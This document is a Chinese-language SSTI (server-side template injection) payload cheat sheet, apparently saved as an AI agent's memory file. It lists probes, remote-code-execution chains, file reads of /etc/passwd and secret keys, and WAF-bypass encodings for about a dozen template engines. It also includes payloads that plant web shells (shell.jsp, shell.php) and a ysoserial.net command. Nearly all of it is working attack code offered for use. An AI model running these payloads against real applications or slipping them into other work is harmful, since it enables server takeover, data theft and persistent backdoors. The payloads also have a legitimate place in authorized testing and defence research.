---
name: kb_ssti_template_injection_2026
description: SSTI服务端模板注入速查 Payload大全 Jinja2/FreeMarker/Velocity/Thymeleaf/Twig/Smarty/Mako/Pug/Jade/.NET Razor 检测+利用+RCE
metadata: 
  node_type: memory
  type: reference
  originSessionId: 5d675b98-bcc4-43f6-b8de-46635cd0836f
---

# SSTI 服务端模板注入速查 (2026版)

## 一、SSTI 检测通用方法

### 通用探测 Payload (数学运算)
```
{{7*7}}          → 49 = SSTI
${7*7}           → 49 = SSTI
<%=7*7%>         → 49 = SSTI (ERB/JSP)
#{7*7}           → 49 = SSTI (Pug/Groovy)
```

### 按编码绕过WAF
```
{{7*'7'}}             # Jinja2字符串乘法 → 7777777
${{7*7}}              # 双层嵌套
{{config|attr('__class__')}}  # Jinja2绕过config过滤
{{"".__class__}}      # 空字符串获取class
{{()|attr('__class__')}} # 元组获取class
```

---

## 二、Python 模板引擎

### Jinja2 (Flask) ⭐⭐⭐⭐⭐

**基础探测**
```
{{7*7}}                          # 49
{{config.items()}}               # Flask配置泄露
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}  
# 完整RCE链 (Flask)
```

**Jinja2 RCE 链**
```
# 链1: lipnum → __globals__
{{ lipsum.__globals__["os"].popen('id').read() }}

# 链2: cycler → __init__ → __globals__
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# 链3: joiner → __init__ → __globals__
{{ joiner.__init__.__globals__.os.popen('id').read() }}

# 链4: namespace → __init__ → __globals__
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 链5: get_flashed_messages → __globals__
{{ get_flashed_messages.__globals__.os.popen('id').read() }}

# 链6: URL重写绕过config/__class__被过滤
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}

# 链7: 最短RCE (新版本)
{{lipsum.__globals__['os'].popen('id').read()}}
```

**Jinja2 文件读取**
```
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
{{ config.items() }}  # 读Flask SECRET_KEY等配置
```

**Jinja2 SSTI 防护绕过**
```
# __class__ 被过滤
{{ ()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f") }}  # 十六进制编码

# 利用 request.args 传参
{{ lipsum.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read() }}
&a=os&b=id

# 利用 request.cookies
{{ lipsum.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read() }}
Cookie: a=os;b=popen;c=id
```

### Mako (Pyramid/Bottle)

```
${7*7}
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.popen("id").read()}
${__import__("os").popen("id").read()}
```

### Tornado

```
{{7*7}}
{{__import__("os").popen("id").read()}}
{% import os %}{{os.popen("id").read()}}
```

---

## 三、Java 模板引擎

### FreeMarker ⭐⭐⭐⭐

```
# 探测
${7*7}

# RCE Execute (需new权限)
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }

# RCE ObjectConstructor
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
${ ob("java.lang.ProcessBuilder","id".split(" ")).start() }

# RCE JythonRuntime (需jython依赖)
<#assign ob="freemarker.template.utility.JythonRuntime"?new()>
<@ob>import os; os.system("id")</@ob>

# 文件读取
<#assign is=object?new("java.io.FileInputStream","/etc/passwd")>

# API绕过 (api内置对象)
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity

```
# 探测
#set($x=7*7)$x

# RCE (需Runtime访问)
#set($cmd="id")
#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())
#set($proc=$rt.exec($cmd))
$proc.waitFor()

# 反射链
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
```

### Thymeleaf ⭐⭐⭐

```
# Spring Boot + Thymeleaf 常见路径
__${7*7}__::.x                     # __${}__ 预处理表达式
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# 模板名注入 (路径穿越)
/path?name=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x

# 写文件+Spring Boot
__${new java.io.FileOutputStream("/tmp/shell.jsp").write("<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>")}__::.x
```

### Pug/Jade

```
#{7*7}
#{global.process.mainModule.constructor._load('child_process').execSync('id').toString()}
```

---

## 四、PHP 模板引擎

### Twig (Symfony)

```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}                   # Twig 3.x

# 文件读取
{{'/etc/passwd'|file_excerpt(1,30)}}

# 变量泄露
{{app}} / {{app.request}} / {{app.request.server}}
```

### Smarty

```
{7*7}
{system('id')}
{Smarty_Internal_Write_File::writeFile(['/var/www/html/shell.php'],'<?php system($_GET[1]);?>')}
{php}system('id');{/php}
{include file="/etc/passwd"}
```

### Blade (Laravel)

```
{{7*7}}
{{file_get_contents('/etc/passwd')}}
{{system('id')}}  # 罕见，通常被禁用
```

---

## 五、.NET 模板引擎

### Razor (.cshtml)

```
@(7*7)
@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }
@System.IO.File.ReadAllText(@"C:\Windows\win.ini")
```

### ASP.NET ViewState 反序列化

```
# .NET反序列化→RCE (需 ysoserial.net)
ysoserial.net -g ObjectDataProvider -c "cmd" -f LosFormatter
```

---

## 六、Node.js 模板引擎

### Pug/Jade (Node.js)

```
#{7*7}
#{global.process.mainModule.require('child_process').execSync('id')}
```

### EJS

```
<%=7*7%>
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

### Handlebars

```
{{7*7}}
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## 七、检测工具 + 字典

### 自动化检测
- **tplmap**: Python SSTI自动检测+利用框架
- **SSTImap**: Flask/Jinja2 专用利用
- **Burp插件**: SSTI Detector / Backslash Powered Scanner

### 通用 Fuzzing 字典
```
{{7*7}}
${7*7}
<%=7*7%>
#{7*7}
{{'7'*7}}
${{7*7}}
{7*7}
[[7*7]]
{% print(7*7) %}
{{=7*7}}
```

### 按引擎选择下一步 Payload
```
Jinja2   → {{config.items()}} → lipsum.__globals__
FreeMarker → <#assign ex="freemarker.template.utility.Execute"?new()>
Velocity → #set($rt=$class.inspect("java.lang.Runtime")...)
Thymeleaf → __${T(java.lang.Runtime)...}__::.x
Twig     → {{_self.env.registerUndefinedFilterCallback("exec")}}
Smarty   → {system('id')}
Pug      → #{global.process.mainModule...}
```

---

## 八、绕过技巧总结

### 常用过滤器/函数被WAF拦截时
```
# 空格绕过
{{lipsum.__globals__['os'].popen('cat\x20/etc/passwd')}}

# 引号绕过
{{lipsum.__globals__[request.args.a]}}&a=os

# 点号绕过
{{()|attr('__class__')}}                          # 等价于 ().__class__
{{''.__class__.__base__.__subclasses__()}}        # Python MRO链

# 十六进制编码绕过关键字
{{''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']}}  # '__class__'

# 字符串拼接绕过
{{'__cla'+'ss__'}}
{{()|attr('__cla'+'ss__')}}

# 利用过滤器
{{()|attr(config|string|slice(1,2))}}             # 取config字符串第1字符拼payload
```